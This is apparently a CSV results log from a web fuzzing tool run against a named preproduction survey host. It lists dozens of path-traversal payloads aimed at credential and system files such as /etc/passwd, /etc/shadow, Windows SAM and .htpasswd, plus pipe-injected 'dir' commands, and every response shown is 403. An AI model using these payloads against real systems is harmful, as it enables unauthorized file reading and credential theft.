FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://survey-preprod-sandbox.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,28.212237ms,
../../../../winnt/repair/sam._,https://survey-preprod-sandbox.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,27.546136ms,
//./../.../boot.ini,https://survey-preprod-sandbox.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,27.238437ms,
../.htaccess,https://survey-preprod-sandbox.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,27.882623ms,
a\..\..\muster.db,https://survey-preprod-sandbox.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,27.426936ms,
./../../../../../../../../../../etc/passwd,https://survey-preprod-sandbox.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,28.334535ms,
../etc/passwd,https://survey-preprod-sandbox.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,27.769709ms,
../../../apache/logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,27.480875ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://survey-preprod-sandbox.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,27.91951ms,
./../../../../../../../../../../etc/shadow,https://survey-preprod-sandbox.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,39.03373ms,
../config.dat,https://survey-preprod-sandbox.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,28.23767ms,
../apache/logs/access.log,https://survey-preprod-sandbox.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,27.340203ms,
../www,https://survey-preprod-sandbox.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,32.396774ms,
../config.asp,https://survey-preprod-sandbox.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,27.522495ms,
./.././..//etc/passwd,https://survey-preprod-sandbox.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,32.919324ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://survey-preprod-sandbox.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,41.081444ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://survey-preprod-sandbox.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,27.496231ms,
../.htpasswd,https://survey-preprod-sandbox.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,28.002692ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://survey-preprod-sandbox.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,27.580252ms,
../..//etc/passwd,https://survey-preprod-sandbox.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,27.28254ms,
static/../../../../windows/win.ini,https://survey-preprod-sandbox.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,29.552514ms,
%2e%2e//google.com,https://survey-preprod-sandbox.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,33.320027ms,
../../../..//etc/passwd;index.html,https://survey-preprod-sandbox.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,27.991772ms,
modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,https://survey-preprod-sandbox.officevibe.com/modx/assets/cache/docid_1/../../../../../../../etc/passwd\0.pageCache.php,,206747,403,312,17,7,text/html; charset=us-ascii,28.790446ms,
/./../.../boot.ini,https://survey-preprod-sandbox.officevibe.com//./../.../boot.ini,,208978,403,312,17,7,text/html; charset=us-ascii,27.904398ms,
../config.inc.php,https://survey-preprod-sandbox.officevibe.com/../config.inc.php,,211520,403,312,17,7,text/html; charset=us-ascii,28.089134ms,
../manager/html,https://survey-preprod-sandbox.officevibe.com/../manager/html,,213723,403,312,17,7,text/html; charset=us-ascii,27.474554ms,
../../../../apache/logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../../../apache/logs/access.log,,214776,403,312,17,7,text/html; charset=us-ascii,33.285372ms,
../admim,https://survey-preprod-sandbox.officevibe.com/../admim,,217845,403,312,17,7,text/html; charset=us-ascii,28.378311ms,
..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,https://survey-preprod-sandbox.officevibe.com/..%2F..%2F..%2F..%2F..%2F../windows/repair/sam,,218082,403,312,17,7,text/html; charset=us-ascii,27.821664ms,
../../../../logs/access.log,https://survey-preprod-sandbox.officevibe.com/../../../../logs/access.log,,222807,403,312,17,7,text/html; charset=us-ascii,27.529887ms,
js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://survey-preprod-sandbox.officevibe.com/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,224364,403,312,17,7,text/html; charset=us-ascii,27.576891ms,
"alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,","https://survey-preprod-sandbox.officevibe.com/alibaba.pl|dir%20..\\..\\..\\..\\..\\..\\..\\,",,226017,403,312,17,7,text/html; charset=us-ascii,27.731842ms,
../../etc/passwd,https://survey-preprod-sandbox.officevibe.com/../../etc/passwd,,226249,403,312,17,7,text/html; charset=us-ascii,27.916297ms,
static/..%5c..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5cetc/passwd,,226291,403,312,17,7,text/html; charset=us-ascii,28.66492ms,
//////../../../../../../etc/passwd,https://survey-preprod-sandbox.officevibe.com///////../../../../../../etc/passwd,,226989,403,312,17,7,text/html; charset=us-ascii,27.784921ms,
"cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://survey-preprod-sandbox.officevibe.com/cgi-bin/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,228125,403,312,17,7,text/html; charset=us-ascii,28.109307ms,
../../data/config/microsrv.cfg,https://survey-preprod-sandbox.officevibe.com/../../data/config/microsrv.cfg,,228343,403,312,17,7,text/html; charset=us-ascii,27.497495ms,
../../..//etc/passwd;index.html,https://survey-preprod-sandbox.officevibe.com/../../..//etc/passwd;index.html,,233973,403,312,17,7,text/html; charset=us-ascii,28.193635ms,
../..//etc/passwd;index.html,https://survey-preprod-sandbox.officevibe.com/../..//etc/passwd;index.html,,239233,403,312,17,7,text/html; charset=us-ascii,27.563697ms,
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,https://survey-preprod-sandbox.officevibe.com/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini,,241360,403,312,17,7,text/html; charset=us-ascii,28.09207ms,
..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd,,243557,403,312,17,7,text/html; charset=us-ascii,27.506044ms,
../../../../../../../../../boot.ini,https://survey-preprod-sandbox.officevibe.com/../../../../../../../../../boot.ini,,245648,403,312,17,7,text/html; charset=us-ascii,28.042733ms,
../console,https://survey-preprod-sandbox.officevibe.com/../console,,250034,403,312,17,7,text/html; charset=us-ascii,28.006001ms,
../../windows/win.ini,https://survey-preprod-sandbox.officevibe.com/../../windows/win.ini,,253997,403,312,17,7,text/html; charset=us-ascii,28.225867ms,
../../../administrator/inbox,https://survey-preprod-sandbox.officevibe.com/../../../administrator/inbox,,255033,403,312,17,7,text/html; charset=us-ascii,27.618748ms,
static/..%5c..%5c..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/static/..%5c..%5c..%5c..%5c..%5cetc/passwd,,255283,403,312,17,7,text/html; charset=us-ascii,27.77752ms,
dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,https://survey-preprod-sandbox.officevibe.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole,,258795,403,312,17,7,text/html; charset=us-ascii,27.829281ms,
../../../../logs/error.log,https://survey-preprod-sandbox.officevibe.com/../../../../logs/error.log,,259632,403,312,17,7,text/html; charset=us-ascii,27.782044ms,
../../.htaccess,https://survey-preprod-sandbox.officevibe.com/../../.htaccess,,263185,403,312,17,7,text/html; charset=us-ascii,28.311651ms,
..%5c..%5c..%5cetc/passwd,https://survey-preprod-sandbox.officevibe.com/..%5c..%5c..%5cetc/passwd,,263409,403,312,17,7,text/html; charset=us-ascii,27.428398ms,
../../../apache/logs/error.log,https://survey-preprod-sandbox.officevibe.com/../../../apache/logs/error.log,,265724,403,312,17,7,text/html; charset=us-ascii,28.049518ms,
../../../..//etc/passwd,https://survey-preprod-sandbox.officevibe.com/../../../..//etc/passwd,,266700,403,312,17,7,text/html; charset=us-ascii,27.713351ms,
../logs/access.log,https://survey-preprod-sandbox.officevibe.com/../logs/access.log,,270935,403,312,17,7,text/html; charset=us-ascii,27.675843ms,
DomainFiles/*//../../../../../../../../../../etc/passwd,https://survey-preprod-sandbox.officevibe.com/DomainFiles/*//../../../../../../../../../../etc/passwd,,273573,403,312,17,7,text/html; charset=us-ascii,27.75622ms,
../agc/bp.pl,https://survey-preprod-sandbox.officevibe.com/../agc/bp.pl,,276301,403,312,17,7,text/html; charset=us-ascii,27.991628ms,
../install.php,https://survey-preprod-sandbox.officevibe.com/../install.php,,279316,403,312,17,7,text/html; charset=us-ascii,28.753983ms,
./..//etc/passwd,https://survey-preprod-sandbox.officevibe.com/./..//etc/passwd,,281572,403,312,17,7,text/html; charset=us-ascii,26.916459ms,
